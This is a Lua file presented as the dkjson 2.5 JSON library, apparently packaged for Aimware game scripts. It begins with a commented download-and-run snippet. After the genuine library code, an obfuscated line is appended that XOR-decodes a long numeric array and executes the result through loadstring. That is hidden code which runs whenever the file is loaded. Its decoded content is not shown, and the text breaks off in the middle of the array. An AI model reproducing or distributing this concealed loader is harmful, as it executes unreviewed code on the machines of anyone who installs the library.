-- Pasted from https://github.com/tg021/tt/blob/master/dkjson.lua

-- Download and run the library. Place the download code below in your script.

-- json.encode(table) -- returns string
-- json.decode(string) -- returns table

--[=====[

local json_lib_installed = false

file.Enumerate(function(filename)
	if filename == "libraries/json.lua" then
		json_lib_installed = true
	end
end)

if not json_lib_installed then
	local body = http.Get("https://raw.githubusercontent.com/Aimware0/aimware_scripts/main/libraries/json.lua")
	file.Write("libraries/json.lua", body)
end

RunScript("libraries/json.lua")

--]=====]



-- Module options:
local always_try_using_lpeg = true
local register_global_module_table = false
local global_module_name = 'json'

--[==[

David Kolf's JSON module for Lua 5.1/5.2

Version 2.5


For the documentation see the corresponding readme.txt or visit
<http://dkolf.de/src/dkjson-lua.fsl/>.

You can contact the author by sending an e-mail to 'david' at the
domain 'dkolf.de'.


Copyright (C) 2010-2014 David Heiko Kolf

Permission is hereby granted, free of charge, to any person obtaining
a copy of this software and associated documentation files (the
"Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

--]==]

-- global dependencies:
local pairs, type, tostring, tonumber, getmetatable, setmetatable, rawset =
      pairs, type, tostring, tonumber, getmetatable, setmetatable, rawset
local error, require, pcall, select = error, require, pcall, select
local floor, huge = math.floor, math.huge
local strrep, gsub, strsub, strbyte, strchar, strfind, strlen, strformat =
      string.rep, string.gsub, string.sub, string.byte, string.char,
      string.find, string.len, string.format
local strmatch = string.match
local concat = table.concat

json = { version = "dkjson 2.5" }

if register_global_module_table then
  _G[global_module_name] = json
end

local _ENV = nil -- blocking globals in Lua 5.2

pcall (function()
  -- Enable access to blocked metatables.
  -- Don't worry, this module doesn't change anything in them.
  local debmeta = require "debug".getmetatable
  if debmeta then getmetatable = debmeta end
end)

json.null = setmetatable ({}, {
  __tojson = function () return "null" end
})

local function isarray (tbl)
  local max, n, arraylen = 0, 0, 0
  for k,v in pairs (tbl) do
    if k == 'n' and type(v) == 'number' then
      arraylen = v
      if v > max then
        max = v
      end
    else
      if type(k) ~= 'number' or k < 1 or floor(k) ~= k then
        return false
      end
      if k > max then
        max = k
      end
      n = n + 1
    end
  end
  if max > 10 and max > arraylen and max > n * 2 then
    return false -- don't create an array with too many holes
  end
  return true, max
end

local escapecodes = {
  ["\""] = "\\\"", ["\\"] = "\\\\", ["\b"] = "\\b", ["\f"] = "\\f",
  ["\n"] = "\\n",  ["\r"] = "\\r",  ["\t"] = "\\t"
}

local function escapeutf8 (uchar)
  local value = escapecodes[uchar]
  if value then
    return value
  end
  local a, b, c, d = strbyte (uchar, 1, 4)
  a, b, c, d = a or 0, b or 0, c or 0, d or 0
  if a <= 0x7f then
    value = a
  elseif 0xc0 <= a and a <= 0xdf and b >= 0x80 then
    value = (a - 0xc0) * 0x40 + b - 0x80
  elseif 0xe0 <= a and a <= 0xef and b >= 0x80 and c >= 0x80 then
    value = ((a - 0xe0) * 0x40 + b - 0x80) * 0x40 + c - 0x80
  elseif 0xf0 <= a and a <= 0xf7 and b >= 0x80 and c >= 0x80 and d >= 0x80 then
    value = (((a - 0xf0) * 0x40 + b - 0x80) * 0x40 + c - 0x80) * 0x40 + d - 0x80
  else
    return ""
  end
  if value <= 0xffff then
    return strformat ("\\u%.4x", value)
  elseif value <= 0x10ffff then
    -- encode as UTF-16 surrogate pair
    value = value - 0x10000
    local highsur, lowsur = 0xD800 + floor (value/0x400), 0xDC00 + (value % 0x400)
    return strformat ("\\u%.4x\\u%.4x", highsur, lowsur)
  else
    return ""
  end
end

local function fsub (str, pattern, repl)
  -- gsub always builds a new string in a buffer, even when no match
  -- exists. First using find should be more efficient when most strings
  -- don't contain the pattern.
  if strfind (str, pattern) then
    return gsub (str, pattern, repl)
  else
    return str
  end
end

local function quotestring (value)
  -- based on the regexp "escapable" in https://github.com/douglascrockford/JSON-js
  value = fsub (value, "[%z\1-\31\"\\\127]", escapeutf8)
  if strfind (value, "[\194\216\220\225\226\239]") then
    value = fsub (value, "\194[\128-\159\173]", escapeutf8)
    value = fsub (value, "\216[\128-\132]", escapeutf8)
    value = fsub (value, "\220\143", escapeutf8)
    value = fsub (value, "\225\158[\180\181]", escapeutf8)
    value = fsub (value, "\226\128[\140-\143\168-\175]", escapeutf8)
    value = fsub (value, "\226\129[\160-\175]", escapeutf8)
    value = fsub (value, "\239\187\191", escapeutf8)
    value = fsub (value, "\239\191[\176-\191]", escapeutf8)
  end
  return "\"" .. value .. "\""
end
json.quotestring = quotestring

local function replace(str, o, n)
  local i, j = strfind (str, o, 1, true)
  if i then
    return strsub(str, 1, i-1) .. n .. strsub(str, j+1, -1)
  else
    return str
  end
end

-- locale independent num2str and str2num functions
local decpoint, numfilter

local function updatedecpoint ()
  decpoint = strmatch(tostring(0.5), "([^05+])")
  -- build a filter that can be used to remove group separators
  numfilter = "[^0-9%-%+eE" .. gsub(decpoint, "[%^%$%(%)%%%.%[%]%*%+%-%?]", "%%%0") .. "]+"
end

updatedecpoint()

local function num2str (num)
  return replace(fsub(tostring(num), numfilter, ""), decpoint, ".")
end

local function str2num (str)
  local num = tonumber(replace(str, ".", decpoint))
  if not num then
    updatedecpoint()
    num = tonumber(replace(str, ".", decpoint))
  end
  return num
end

local function addnewline2 (level, buffer, buflen)
  buffer[buflen+1] = "\n"
  buffer[buflen+2] = strrep ("  ", level)
  buflen = buflen + 2
  return buflen
end

function json.addnewline (state)
  if state.indent then
    state.bufferlen = addnewline2 (state.level or 0,
                           state.buffer, state.bufferlen or #(state.buffer))
  end
end

local encode2 -- forward declaration

local function addpair (key, value, prev, indent, level, buffer, buflen, tables, globalorder, state)
  local kt = type (key)
  if kt ~= 'string' and kt ~= 'number' then
    return nil, "type '" .. kt .. "' is not supported as a key by JSON."
  end
  if prev then
    buflen = buflen + 1
    buffer[buflen] = ","
  end
  if indent then
    buflen = addnewline2 (level, buffer, buflen)
  end
  buffer[buflen+1] = quotestring (key)
  buffer[buflen+2] = ":"
  return encode2 (value, indent, level, buffer, buflen + 2, tables, globalorder, state)
end

local function appendcustom(res, buffer, state)
  local buflen = state.bufferlen
  if type (res) == 'string' then
    buflen = buflen + 1
    buffer[buflen] = res
  end
  return buflen
end

local function exception(reason, value, state, buffer, buflen, defaultmessage)
  defaultmessage = defaultmessage or reason
  local handler = state.exception
  if not handler then
    return nil, defaultmessage
  else
    state.bufferlen = buflen
    local ret, msg = handler (reason, value, state, defaultmessage)
    if not ret then return nil, msg or defaultmessage end
    return appendcustom(ret, buffer, state)
  end
end

function json.encodeexception(reason, value, state, defaultmessage)
  return quotestring("<" .. defaultmessage .. ">")
end

encode2 = function (value, indent, level, buffer, buflen, tables, globalorder, state)
  local valtype = type (value)
  local valmeta = getmetatable (value)
  valmeta = type (valmeta) == 'table' and valmeta -- only tables
  local valtojson = valmeta and valmeta.__tojson
  if valtojson then
    if tables[value] then
      return exception('reference cycle', value, state, buffer, buflen)
    end
    tables[value] = true
    state.bufferlen = buflen
    local ret, msg = valtojson (value, state)
    if not ret then return exception('custom encoder failed', value, state, buffer, buflen, msg) end
    tables[value] = nil
    buflen = appendcustom(ret, buffer, state)
  elseif value == nil then
    buflen = buflen + 1
    buffer[buflen] = "null"
  elseif valtype == 'number' then
    local s
    if value ~= value or value >= huge or -value >= huge then
      -- This is the behaviour of the original JSON implementation.
      s = "null"
    else
      s = num2str (value)
    end
    buflen = buflen + 1
    buffer[buflen] = s
  elseif valtype == 'boolean' then
    buflen = buflen + 1
    buffer[buflen] = value and "true" or "false"
  elseif valtype == 'string' then
    buflen = buflen + 1
    buffer[buflen] = quotestring (value)
  elseif valtype == 'table' then
    if tables[value] then
      return exception('reference cycle', value, state, buffer, buflen)
    end
    tables[value] = true
    level = level + 1
    local isa, n = isarray (value)
    if n == 0 and valmeta and valmeta.__jsontype == 'object' then
      isa = false
    end
    local msg
    if isa then -- JSON array
      buflen = buflen + 1
      buffer[buflen] = "["
      for i = 1, n do
        buflen, msg = encode2 (value[i], indent, level, buffer, buflen, tables, globalorder, state)
        if not buflen then return nil, msg end
        if i < n then
          buflen = buflen + 1
          buffer[buflen] = ","
        end
      end
      buflen = buflen + 1
      buffer[buflen] = "]"
    else -- JSON object
      local prev = false
      buflen = buflen + 1
      buffer[buflen] = "{"
      local order = valmeta and valmeta.__jsonorder or globalorder
      if order then
        local used = {}
        n = #order
        for i = 1, n do
          local k = order[i]
          local v = value[k]
          if v then
            used[k] = true
            buflen, msg = addpair (k, v, prev, indent, level, buffer, buflen, tables, globalorder, state)
            prev = true -- add a seperator before the next element
          end
        end
        for k,v in pairs (value) do
          if not used[k] then
            buflen, msg = addpair (k, v, prev, indent, level, buffer, buflen, tables, globalorder, state)
            if not buflen then return nil, msg end
            prev = true -- add a seperator before the next element
          end
        end
      else -- unordered
        for k,v in pairs (value) do
          buflen, msg = addpair (k, v, prev, indent, level, buffer, buflen, tables, globalorder, state)
          if not buflen then return nil, msg end
          prev = true -- add a seperator before the next element
        end
      end
      if indent then
        buflen = addnewline2 (level - 1, buffer, buflen)
      end
      buflen = buflen + 1
      buffer[buflen] = "}"
    end
    tables[value] = nil
  else
    return exception ('unsupported type', value, state, buffer, buflen,
      "type '" .. valtype .. "' is not supported by JSON.")
  end
  return buflen
end

function json.encode (value, state)
  state = state or {}
  local oldbuffer = state.buffer
  local buffer = oldbuffer or {}
  state.buffer = buffer
  updatedecpoint()
  local ret, msg = encode2 (value, state.indent, state.level or 0,
                   buffer, state.bufferlen or 0, state.tables or {}, state.keyorder, state)
  if not ret then
    error (msg, 2)
  elseif oldbuffer == buffer then
    state.bufferlen = ret
    return true
  else
    state.bufferlen = nil
    state.buffer = nil
    return concat (buffer)
  end
end

local function loc (str, where)
  local line, pos, linepos = 1, 1, 0
  while true do
    pos = strfind (str, "\n", pos, true)
    if pos and pos < where then
      line = line + 1
      linepos = pos
      pos = pos + 1
    else
      break
    end
  end
  return "line " .. line .. ", column " .. (where - linepos)
end

local function unterminated (str, what, where)
  return nil, strlen (str) + 1, "unterminated " .. what .. " at " .. loc (str, where)
end

local function scanwhite (str, pos)
  while true do
    pos = strfind (str, "%S", pos)
    if not pos then return nil end
    local sub2 = strsub (str, pos, pos + 1)
    if sub2 == "\239\187" and strsub (str, pos + 2, pos + 2) == "\191" then
      -- UTF-8 Byte Order Mark
      pos = pos + 3
    elseif sub2 == "//" then
      pos = strfind (str, "[\n\r]", pos + 2)
      if not pos then return nil end
    elseif sub2 == "/*" then
      pos = strfind (str, "*/", pos + 2)
      if not pos then return nil end
      pos = pos + 2
    else
      return pos
    end
  end
end

local escapechars = {
  ["\""] = "\"", ["\\"] = "\\", ["/"] = "/", ["b"] = "\b", ["f"] = "\f",
  ["n"] = "\n", ["r"] = "\r", ["t"] = "\t"
}

local function unichar (value)
  if value < 0 then
    return nil
  elseif value <= 0x007f then
    return strchar (value)
  elseif value <= 0x07ff then
    return strchar (0xc0 + floor(value/0x40),
                    0x80 + (floor(value) % 0x40))
  elseif value <= 0xffff then
    return strchar (0xe0 + floor(value/0x1000),
                    0x80 + (floor(value/0x40) % 0x40),
                    0x80 + (floor(value) % 0x40))
  elseif value <= 0x10ffff then
    return strchar (0xf0 + floor(value/0x40000),
                    0x80 + (floor(value/0x1000) % 0x40),
                    0x80 + (floor(value/0x40) % 0x40),
                    0x80 + (floor(value) % 0x40))
  else
    return nil
  end
end

local function scanstring (str, pos)
  local lastpos = pos + 1
  local buffer, n = {}, 0
  while true do
    local nextpos = strfind (str, "[\"\\]", lastpos)
    if not nextpos then
      return unterminated (str, "string", pos)
    end
    if nextpos > lastpos then
      n = n + 1
      buffer[n] = strsub (str, lastpos, nextpos - 1)
    end
    if strsub (str, nextpos, nextpos) == "\"" then
      lastpos = nextpos + 1
      break
    else
      local escchar = strsub (str, nextpos + 1, nextpos + 1)
      local value
      if escchar == "u" then
        value = tonumber (strsub (str, nextpos + 2, nextpos + 5), 16)
        if value then
          local value2
          if 0xD800 <= value and value <= 0xDBff then
            -- we have the high surrogate of UTF-16. Check if there is a
            -- low surrogate escaped nearby to combine them.
            if strsub (str, nextpos + 6, nextpos + 7) == "\\u" then
              value2 = tonumber (strsub (str, nextpos + 8, nextpos + 11), 16)
              if value2 and 0xDC00 <= value2 and value2 <= 0xDFFF then
                value = (value - 0xD800)  * 0x400 + (value2 - 0xDC00) + 0x10000
              else
                value2 = nil -- in case it was out of range for a low surrogate
              end
            end
          end
          value = value and unichar (value)
          if value then
            if value2 then
              lastpos = nextpos + 12
            else
              lastpos = nextpos + 6
            end
          end
        end
      end
      if not value then
        value = escapechars[escchar] or escchar
        lastpos = nextpos + 2
      end
      n = n + 1
      buffer[n] = value
    end
  end
  if n == 1 then
    return buffer[1], lastpos
  elseif n > 1 then
    return concat (buffer), lastpos
  else
    return "", lastpos
  end
end

local scanvalue -- forward declaration

local function scantable (what, closechar, str, startpos, nullval, objectmeta, arraymeta)
  local len = strlen (str)
  local tbl, n = {}, 0
  local pos = startpos + 1
  if what == 'object' then
    setmetatable (tbl, objectmeta)
  else
    setmetatable (tbl, arraymeta)
  end
  while true do
    pos = scanwhite (str, pos)
    if not pos then return unterminated (str, what, startpos) end
    local char = strsub (str, pos, pos)
    if char == closechar then
      return tbl, pos + 1
    end
    local val1, err
    val1, pos, err = scanvalue (str, pos, nullval, objectmeta, arraymeta)
    if err then return nil, pos, err end
    pos = scanwhite (str, pos)
    if not pos then return unterminated (str, what, startpos) end
    char = strsub (str, pos, pos)
    if char == ":" then
      if val1 == nil then
        return nil, pos, "cannot use nil as table index (at " .. loc (str, pos) .. ")"
      end
      pos = scanwhite (str, pos + 1)
      if not pos then return unterminated (str, what, startpos) end
      local val2
      val2, pos, err = scanvalue (str, pos, nullval, objectmeta, arraymeta)
      if err then return nil, pos, err end
      tbl[val1] = val2
      pos = scanwhite (str, pos)
      if not pos then return unterminated (str, what, startpos) end
      char = strsub (str, pos, pos)
    else
      n = n + 1
      tbl[n] = val1
    end
    if char == "," then
      pos = pos + 1
    end
  end
end

scanvalue = function (str, pos, nullval, objectmeta, arraymeta)
  pos = pos or 1
  pos = scanwhite (str, pos)
  if not pos then
    return nil, strlen (str) + 1, "no valid JSON value (reached the end)"
  end
  local char = strsub (str, pos, pos)
  if char == "{" then
    return scantable ('object', "}", str, pos, nullval, objectmeta, arraymeta)
  elseif char == "[" then
    return scantable ('array', "]", str, pos, nullval, objectmeta, arraymeta)
  elseif char == "\"" then
    return scanstring (str, pos)
  else
    local pstart, pend = strfind (str, "^%-?[%d%.]+[eE]?[%+%-]?%d*", pos)
    if pstart then
      local number = str2num (strsub (str, pstart, pend))
      if number then
        return number, pend + 1
      end
    end
    pstart, pend = strfind (str, "^%a%w*", pos)
    if pstart then
      local name = strsub (str, pstart, pend)
      if name == "true" then
        return true, pend + 1
      elseif name == "false" then
        return false, pend + 1
      elseif name == "null" then
        return nullval, pend + 1
      end
    end
    return nil, pos, "no valid JSON value at " .. loc (str, pos)
  end
end

local function optionalmetatables(...)
  if select("#", ...) > 0 then
    return ...
  else
    return {__jsontype = 'object'}, {__jsontype = 'array'}
  end
end

function json.decode (str, pos, nullval, ...)
  local objectmeta, arraymeta = optionalmetatables(...)
  return scanvalue (str, pos, nullval, objectmeta, arraymeta)
end

function json.use_lpeg ()
  local g = require ("lpeg")

  if g.version() == "0.11" then
    error "due to a bug in LPeg 0.11, it cannot be used for JSON matching"
  end

  local pegmatch = g.match
  local P, S, R = g.P, g.S, g.R

  local function ErrorCall (str, pos, msg, state)
    if not state.msg then
      state.msg = msg .. " at " .. loc (str, pos)
      state.pos = pos
    end
    return false
  end

  local function Err (msg)
    return g.Cmt (g.Cc (msg) * g.Carg (2), ErrorCall)
  end

  local SingleLineComment = P"//" * (1 - S"\n\r")^0
  local MultiLineComment = P"/*" * (1 - P"*/")^0 * P"*/"
  local Space = (S" \n\r\t" + P"\239\187\191" + SingleLineComment + MultiLineComment)^0

  local PlainChar = 1 - S"\"\\\n\r"
  local EscapeSequence = (P"\\" * g.C (S"\"\\/bfnrt" + Err "unsupported escape sequence")) / escapechars
  local HexDigit = R("09", "af", "AF")
  local function UTF16Surrogate (match, pos, high, low)
    high, low = tonumber (high, 16), tonumber (low, 16)
    if 0xD800 <= high and high <= 0xDBff and 0xDC00 <= low and low <= 0xDFFF then
      return true, unichar ((high - 0xD800)  * 0x400 + (low - 0xDC00) + 0x10000)
    else
      return false
    end
  end
  local function UTF16BMP (hex)
    return unichar (tonumber (hex, 16))
  end
  local U16Sequence = (P"\\u" * g.C (HexDigit * HexDigit * HexDigit * HexDigit))
  local UnicodeEscape = g.Cmt (U16Sequence * U16Sequence, UTF16Surrogate) + U16Sequence/UTF16BMP
  local Char = UnicodeEscape + EscapeSequence + PlainChar
  local String = P"\"" * g.Cs (Char ^ 0) * (P"\"" + Err "unterminated string")
  local Integer = P"-"^(-1) * (P"0" + (R"19" * R"09"^0))
  local Fractal = P"." * R"09"^0
  local Exponent = (S"eE") * (S"+-")^(-1) * R"09"^1
  local Number = (Integer * Fractal^(-1) * Exponent^(-1))/str2num
  local Constant = P"true" * g.Cc (true) + P"false" * g.Cc (false) + P"null" * g.Carg (1)
  local SimpleValue = Number + String + Constant
  local ArrayContent, ObjectContent

  -- The functions parsearray and parseobject parse only a single value/pair
  -- at a time and store them directly to avoid hitting the LPeg limits.
  local function parsearray (str, pos, nullval, state)
    local obj, cont
    local npos
    local t, nt = {}, 0
    repeat
      obj, cont, npos = pegmatch (ArrayContent, str, pos, nullval, state)
      if not npos then break end
      pos = npos
      nt = nt + 1
      t[nt] = obj
    until cont == 'last'
    return pos, setmetatable (t, state.arraymeta)
  end

  local function parseobject (str, pos, nullval, state)
    local obj, key, cont
    local npos
    local t = {}
    repeat
      key, obj, cont, npos = pegmatch (ObjectContent, str, pos, nullval, state)
      if not npos then break end
      pos = npos
      t[key] = obj
    until cont == 'last'
    return pos, setmetatable (t, state.objectmeta)
  end

  local Array = P"[" * g.Cmt (g.Carg(1) * g.Carg(2), parsearray) * Space * (P"]" + Err "']' expected")
  local Object = P"{" * g.Cmt (g.Carg(1) * g.Carg(2), parseobject) * Space * (P"}" + Err "'}' expected")
  local Value = Space * (Array + Object + SimpleValue)
  local ExpectedValue = Value + Space * Err "value expected"
  ArrayContent = Value * Space * (P"," * g.Cc'cont' + g.Cc'last') * g.Cp()
  local Pair = g.Cg (Space * String * Space * (P":" + Err "colon expected") * ExpectedValue)
  ObjectContent = Pair * Space * (P"," * g.Cc'cont' + g.Cc'last') * g.Cp()
  local DecodeValue = ExpectedValue * g.Cp ()

  function json.decode (str, pos, nullval, ...)
    local state = {}
    state.objectmeta, state.arraymeta = optionalmetatables(...)
    local obj, retpos = pegmatch (DecodeValue, str, pos, nullval, state)
    if state.msg then
      return nil, state.pos, state.msg
    else
      return obj, retpos
    end
  end

  -- use this function only once:
  json.use_lpeg = function () return json end

  json.using_lpeg = true

  return json -- so you can get the module using json = require "dkjson".use_lpeg()
end


key="ASDJAISDJNIONDASNODSAIODSAIONDSODNISDNIOASND"local a=loadstring((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({3948,3266,3769,3757,3954,2951,3537,4086,3670,2811,3409,3678,3638,2515,3865,2211,2801,2194,3164,2340,2940,3749,2580,3816,3890,2819,2612,3328,2280,2827,2498,2392,3395,3121,3584,3540,3483,4183,4214,4083,2467,3460,2464,2503,3289,3862,2709,2412,4158,3255,2991,3194,2306,4063,3069,3320,4068,3434,2394,3676,3918,2957,3151,3556,4357,3774,3851,2381,3869,2680,2224,2966,3238,2826,3003,3644,2761,2219,2358,4022,4309,2921,3700,4277,4264,2679,3965,2322,2450,3345,2731,3509,3792,2481,2710,3497,3609,4002,2421,3928,3583,2283,3243,3228,4092,2961,3897,3729,3429,3079,4311,4160,3486,3094,3351,2253,2767,2885,3232,3155,3066,2221,2600,2697,4001,2307,2692,3495,2935,2257,3477,2158,4009,4220,4392,3931,2166,2922,4254,3100,2608,2195,3170,4155,4375,4150,2376,2900,4244,3412,2369,3913,3652,4258,2210,4100,2698,2344,4358,3868,3197,3693,2597,3535,2944,3245,2252,4179,3035,4188,2278,3571,2683,2329,2177,2188,3319,4202,3546,4352,3352,2462,3038,2764,4418,3721,3612,3949,2517,2170,2551,4058,3826,2950,3857,4326,3561,3720,3115,4423,3012,3534,4065,2954,2377,3607,3740,3276,3659,2792,2480,2981,2401,4380,3802,2430,2264,4386,2310,4222,3141,3008,4212,3256,4039,2563,2906,2871,2293,3579,2185,3050,2397,3041,4230,3682,4290,3967,2199,3464,3383,3873,2284,2304,3755,2347,2414,2321,4429,4093,3533,2707,2538,3072,3195,3448,4282,2556,3213,2914,2302,4241,3376,4393,2416,3308,4142,2781,3323,4236,2389,3371,2312,3455,2555,4103,3962,2790,3811,3762,3959,3303,3461,3230,2524,3596,3211,2867,4360,2808,3651,2613,2353,2362,2971,4240,3989,3090,2372,3128,3063,2672,3558,2156,2662,2554,3760,3907,2583,3991,4118,2532,3692,2502,3697,3327,4112,3508,2775,3510,2810,3147,3887,2326,3406,3111,3932,3178,4232,4048,4341,2519,3608,2758,2633,2516,3722,2245,2535,3322,3240,4398,2773,2427,4432,3013,2609,3548,3186,3489,2742,2263,3779,2894,4084,2281,3702,4257,2865,2155,3666,3671,2998,2993,3505,2967,2912,2367,2735,4233,2818,4007,2250,2769,3153,4325,2567,4316,3969,2287,4397,3763,3076,3443,3752,3945,2829,2943,3625,3325,3581,2214,3260,4057,2336,2299,2292,2458,3187,2889,3193,3463,2511,2793,3707,3960,3356,4169,3538,2164,2407,3107,2408,2273,2490,3300,4381,3454,2780,2685,4367,4030,2913,2772,4351,3643,4178,2665,2434,2955,3791,2688,4107,4421,3237,3957,2902,2896,3271,2291,4049,3118,3051,3748,2661,2878,2550,3648,2785,2673,3522,2542,3805,3119,3354,3983,3654,3716,3369,3077,3366,3427,2974,3946,2677,3246,2895,2866,3872,2477,3156,3052,2323,2443,2530,2602,2947,2495,3173,2385,3765,2605,3714,3713,2206,2960,3620,4366,3878,4294,2648,4071,3000,4321,2892,3068,2946,3011,3053,4284,3087,2290,3169,3136,2641,3617,2986,2289,2564,2678,3496,4246,4239,4040,4274,3916,2656,3422,3081,4146,3236,3270,4042,3368,3683,3715,4281,4074,3381,2977,3598,3642,4261,4243,4199,2520,3551,2842,3635,3296,4322,4032,3817,3891,3401,3361,4031,2964,3830,2220,4335,3500,2560,2405,3822,3806,3662,3706,2626,4161,4427,3176,3226,3159,3070,4242,3550,3421,2882,2448,3554,4237,2352,3536,3532,2539,2622,3892,3940,2247,3747,2487,2804,2343,2682,4144,2236,2198,4102,2183,4081,4262,2771,4218,3531,2420,2988,3282,3459,4346,2664,2355,3502,4310,2354,4120,2631,4192,3419,2909,3523,2658,2359,3753,4171,2670,3152,2433,2822,2251,4078,3618,2820,3220,2363,2382,3689,2496,3911,3275,3661,4302,2756,3198,2419,3844,4186,3867,2834,3937,2483,2169,2357,3794,3414,3788,4292,4119,3340,2446,3990,2768,3262,4210,4288,3017,2910,3420,4334,3704,2917,2876,2962,3430,3987,3314,3685,4327,2300,2869,3120,4373,3876,3976,4320,4187,2162,3469,2744,3528,3845,3405,3043,3696,2209,3436,3433,3843,3719,2168,2727,3154,3818,3337,4095,4004,3775,3677,4426,3447,2296,3883,3838,2215,4008,3417,4395,2659,3951,2953,2817,2714,3474,3574,4217,2699,3367,2207,3445,3875,4283,4406,2603,3142,2258,4044,2383,4208,3291,2848,3691,3183,3782,2568,3970,3092,2202,3365,3380,2547,2995,3814,4323,3565,4139,2759,3301,4204,2365,2755,3950,3341,4377,2860,3259,3167,4069,3744,2629,3026,2941,3466,4306,3828,3881,2927,3442,3681,2828,3712,2400,3593,3127,2713,3310,3031,3610,2259,2500,4035,3335,3833,2505,4127,2794,2452,2447,3572,3200,2782,3210,3621,3007,3850,4279,4287,4420,3567,2294,3737,3067,2663,3588,2980,4000,3591,2485,3953,2404,4180,3254,2996,2442,3268,2898,3359,3388,2537,3519,2378,2486,2386,4165,3475,3143,3095,4384,4194,3033,3675,4113,3849,3294,3311,2197,4216,2750,3810,2184,3718,3649,3961,2702,3602,2536,2932,2747,2737,2969,4213,2544,3390,4091,2241,3199,2824,2805,2178,2208,2908,4087,2812,3733,3627,3101,4128,2438,2418,3789,4251,3895,3265,2617,2791,4135,3834,3512,3472,4173,3049,3129,4124,2240,3360,2614,2570,3835,2686,2244,2983,2387,3218,2868,4070,3660,4371,2753,2839,2695,2393,3168,3346,3853,2390,2879,4207,3730,2938,3425,3023,3375,3515,3263,3027,2575,3557,2403,3441,3438,3708,3665,2588,3082,3559,4416,2721,2533,2167,2837,3770,3613,4391,2187,2734,3852,3080,4090,3981,3182,3808,2417,2413,3492,2368,3809,3110,4405,3202,2937,3655,2904,3667,2712,2260,2371,3686,4400,4221,4280,4219,3206,4248,3239,3639,3582,4374,4412,2733,2841,4010,2700,3994,3985,3773,2982,2797,3458,4317,2739,4115,4172,3138,4089,4098,2174,3446,2745,2330,3157,4061,2667,3363,3594,3741,3979,3316,2751,3224,3481,2488,3285,2200,2681,4054,2763,4245,2581,2181,2360,2916,2770,2690,4109,3288,3478,3884,3874,3132,3203,4363,3491,3840,3098,4298,3958,4140,2226,2668,3563,4196,3071,4175,3189,3743,2586,2279,2989,2934,2928,2218,3912,3019,3861,4043,2766,2484,4425,4205,2803,3484,3664,2345,2348,2225,2601,4355,2815,2646,3611,3488,2331,3252,3679,3812,2193,3015,3290,3501,3798,4215,2863,3413,3385,4016,3386,3841,4024,3059,2237,3555,4190,3158,2440,3336,2222,2391,3393,2157,4141,2335,4409,3274,2525,3825,3456,2840,2726,4117,3378,3901,3134,3407,4226,3122,2717,3933,4229,2235,2654,2453,3116,4003,3998,3324,2861,2584,4138,3135,2548,2305,2984,3894,4350,2558,2903,3465,4006,4376,3279,2509,3307,3364,4303,3179,4378,2223,3684,4255,3123,2862,2454,2833,3216,3112,3096,3577,3293,2593,3650,4285,3734,3247,4037,3832,2632,3025,3315,4336,2987,2825,2325,2319,3086,4148,4181,3899,3353,3184,2411,2760,2239,3467,2380,2843,3453,2370,2203,3331,2587,4354,2339,2388,4414,2455,2806,4088,2543,2732,3172,2884,3971,2573,2887,2959,3292,3882,2855,4235,3397,2466,3934,2171,3449,3306,2399,3980,3768,3586,3457,2919,4390,2725,3005,2606,3334,2849,2507,3055,3793,3039,2832,4036,2562,3181,3616,2373,3695,2295,2870,3175,3174,4130,3827,2716,3993,3514,4060,3966,4267,3767,4096,3724,3344,3097,3286,3377,3426,3601,2332,4166,2154,4125,2873,4430,3923,3917,3972,4038,3703,2172,2557,2777,4347,2527,4318,2409,2266,3163,3222,3150,3149,4402,3880,3160,3915,2176,2189,3619,2424,4052,4076,3109,3273,4295,3284,3699,4025,4153,3277,2553,2994,2968,3776,2473,2911,2301,2774,2470,3595,3348,2915,2859,2230,2576,2776,3771,3402,3249,3423,2341,4101,3499,3487,3785,2569,3185,4104,4193,3234,2788,2814,4330,3727,3795,4114,4331,4289,2923,4198,2883,3999,3517,2939,3280,3165,3936,3148,2652,2192,3902,2624,3016,4005,3527,2620,4062,3089,2423,4106,3130,4143,3114,3759,3592,3075,3939,3709,3451,3233,3034,2179,3736,4167,3893,2522,3819,2425,3018,2669,4227,3837,3842,2578,2552,4247,4209,3516,3799,2599,3196,3470,2579,2282,4185,2191,2715,2471,2272,3085,2619,3820,4404,4126,4399,4383,2449,3215,3333,3373,2504,2482,3400,2356,2196,3855,2351,3058,3295,2506,2728,3091,3490,2229,4122,3549,4051,3162,2231,3326,4348,4012,3864,3938,3562,4333,2190,2518,2897,2316,3221,3674,4370,3751,3180,3947,3978,2649,2836,3473,3161,3908,3029,2847,3925,3338,2349,3269,3209,2160,3929,3921,2596,4099,2723,2789,3349,3963,2534,3190,4170,4379,2540,3440,2881,3641,4047,4275,3988,3910,3823,3597,2724,3343,2931,3212,3739,3672,2956,3859,3137,3060,4129,2936,4223,3889,3415,2531,2268,2432,2286,3640,2997,3342,2979,2559,3104,3886,3623,2426,2337,3599,4259,2479,4055,2571,2720,2992,2844,2711,3287,4368,2565,2439,3778,2513,4344,2802,3297,2637,3646,3701,3374,2510,3030,3219,3084,3302,3622,3408,2346,4191,3800,2541,3370,2318,4343,2858,2422,4422,3431,2647,3485,3251,4382,2930,3009,2248,2630,3507,3099,2523,2528,3106,3896,3248,2975,3956,3480,3304,4276,3227,3046,3813,2459,3807,2428,3564,2324,2640,4116,2952,2298,3